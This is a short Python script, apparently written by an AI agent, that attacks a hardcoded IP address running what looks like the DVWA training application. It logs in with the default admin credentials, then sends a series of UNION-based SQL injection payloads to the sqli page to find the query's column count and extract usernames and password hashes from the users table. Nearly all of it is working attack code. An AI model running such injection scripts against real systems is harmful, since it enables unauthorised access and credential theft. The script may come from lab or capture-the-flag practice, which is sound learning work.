
import requests
import re
import html

session = requests.Session()
target_url = 'http://31.97.117.123'
login_url = f'{target_url}/login.php'

# Login first
def login():
    response = session.get(login_url, timeout=10)
    match = re.search(r"user_token'\s+value='([^']+)'", response.text)
    token = match.group(1) if match else None
    
    if token:
        data = {
            'username': 'admin',
            'password': 'password',
            'user_token': token,
            'Login': 'Login'
        }
        session.post(login_url, data=data, timeout=10, allow_redirects=True)
        return True
    return False

login()

sqli_url = f'{target_url}/vulnerabilities/sqli/'

print("[*] Probing database structure to find password hashes...")
print("[*] Let me try to extract the actual database column names\n")

# Try to see the actual query structure
payloads = [
    "1",  # baseline
    "1 UNION SELECT 1,2,3,4--+",  # check column count
    "1 UNION SELECT 1,2,3,4 FROM users--+",  # get column count from users table
    "1 UNION SELECT user_id,user,password,user_avatar FROM users LIMIT 1--+",  # extract first user with password
]

for payload in payloads:
    print(f"[*] Payload: {payload}")
    data = {
        'id': payload,
        'Submit': 'Submit'
    }
    response = session.post(sqli_url, data=data, timeout=10)
    
    # Extract the pre content which contains the query results
    match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if match:
        content = html.unescape(match.group(1))
        print(f"Response: {content[:300]}")
    print()

